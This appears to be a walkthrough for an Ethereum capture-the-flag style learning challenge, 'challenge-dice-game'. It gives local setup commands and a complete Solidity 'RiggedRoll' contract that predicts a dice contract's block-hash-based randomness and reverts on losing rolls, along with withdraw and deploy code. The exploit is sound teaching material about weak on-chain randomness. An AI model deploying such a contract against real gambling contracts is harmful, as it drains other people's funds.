Phase 1: ðŸ“¦ Setup
Get your environment running first.

1.)Terminal 1: Download and start the chain.

          Bash
           npx create-eth@2.0.4 -e challenge-dice-game challenge-dice-game
           cd challenge-dice-game
           yarn chain

2.)Terminal 2: Start the app.

         Bash
           cd challenge-dice-game
           yarn start

3.)Terminal 3: Deploy the initial contracts.

         Bash
          cd challenge-dice-game
          yarn deploy

Phase 2: ðŸ”‘ Write the Exploit Contract
Open packages/hardhat/contracts/RiggedRoll.sol. This is where you will do all your coding.

Step 1: Clean the file Delete the existing code inside RiggedRoll.sol (except the license and imports) and replace it with the below code

Step 2: Implement the Solution Here is the complete code combining Checkpoint 2 (The Rigged Roll) and Checkpoint 3 (Withdraw).

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    // Custom Errors defined in the challenge
    error NotEnoughETH(uint256 required, uint256 available);
    error NotWinningRoll(uint256 roll);
    error InsufficientBalance(uint256 requested, uint256 available);

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // --- Checkpoint 2: Enable receiving ETH ---
    receive() external payable {}

    // --- Checkpoint 2: The Attack Function ---
    function riggedRoll() external {
        uint256 required = 0.002 ether;
        
        // 1. Check if we have enough ETH to bet
        if (address(this).balance < required) {
            revert NotEnoughETH(required, address(this).balance);
        }

        // 2. Predict the randomness (Exact same logic as DiceGame.sol)
        // We look at the previous block hash and the DiceGame's current nonce
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 nonce = diceGame.nonce();
        
        // 3. Replicate the hash generation
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

        console.log("Predicted Roll:", roll);

        // 4. Check if we win (0, 1, 2, 3, 4, 5 are winners)
        if (roll > 5) {
            // IF WE LOSE: Revert the transaction. 
            // This cancels the bet and saves our money (we only pay gas).
            revert NotWinningRoll(roll);
        }

        // IF WE WIN: Call the real contract
        diceGame.rollTheDice{value: required}();
    }

    // --- Checkpoint 3: Withdraw Functions ---
    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        uint256 available = address(this).balance;
        
        if (_amount > available) {
            revert InsufficientBalance(_amount, available);
        }
        
        (bool success, ) = payable(_addr).call{value: _amount}("");
        require(success, "Withdraw failed");
    }
}

Phase 3: ðŸš€ Deploy & Attack
Now you need to tell the system to deploy your new contract.

Open packages/hardhat/deploy/01_deploy_riggedRoll.ts.

Uncomment the deployment code. It is usually commented out by default. Ensure it looks like this:

TypeScript
const riggedRoll = await deploy("RiggedRoll", {
  from: deployer,
  args: [diceGame.address],
  log: true,
  autoMine: true,
});
Transfer Ownership (Vital for frontend): Add this line right after the deploy command in the same file. This allows your frontend wallet to call withdraw.

TypeScript
// Get the frontend address (usually the first signer in Hardhat)
// OR just transfer it to your specific address if testing manually
// For the challenge script, simple deployment is often enough, 
// but ensure you can withdraw:
// await riggedRoll.transferOwnership("YOUR_FRONTEND_ADDRESS_HERE");
Note: For the local test environment, the deployer is often the same account used in the first hardhat account, so standard deployment usually works fine.
